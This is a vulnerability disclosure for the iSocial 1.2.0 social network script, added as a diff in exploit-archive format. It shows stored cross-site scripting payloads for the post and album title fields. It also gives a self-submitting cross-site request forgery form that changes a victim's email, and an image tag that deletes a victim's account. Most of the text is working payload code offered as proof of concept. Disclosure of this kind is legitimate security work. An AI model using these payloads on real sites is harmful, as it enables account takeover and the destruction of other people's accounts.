@@ -1,0 +1,51 @@
+# Exploit Title: iSocial 1.2.0 - Cross-Site Scripting / Cross-Site Request Forgery
+# Date: 2018-05-22
+# Exploit Author: Borna nematzadeh (L0RD)
+# Vendor Homepage: https://codecanyon.net/item/isocial-social-network-platform/21164041?s_rank=2
+# Version: 1.2.0
+# Tested on: Kali linux
+
+# POC 1 : Cross-Site scripting:
+
+1) Create your account and navigate to "write post".
+2) Put this payload and click on "post" :
+<script>alert(document.cookie)</script>
+3) You will have an alert box in your page .
+
+# POC 2 : Cross-Site Scripting:
+
+1) Navigate to "Albums" and click on "create album"
+2) In title field , put this payload :
+"/><script>alert(document.cookie)</script>
+3) In both cases , the payload will be executed after someone opens your
+album or your profile.
+
+# POC 3 : Cross-Site Request Forgery:
+# iSocial - Social Network Platform 1.2.0 suffers from csrf vulnerability .
+# Attacker can easily change user's email or delete user's account .
+
+# Change email Exploit :
+
+<html>
+<head>
+   <title>CSRF POC</title>
+</head>
+  <body>
+    <form action="http://Target/isocial/demo/services/actionssetting/email" method="POST">
+      <input type="hidden" name="em" value="lord2&#64;gmail&#46;com" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+# Result :
+# html    "The information has been updated"
+# status    "OK"
+# message    ""
+
+# Delete account Exploit:
+
+<img src="
+http://Target/isocial/demo/services/actionssetting/delete">
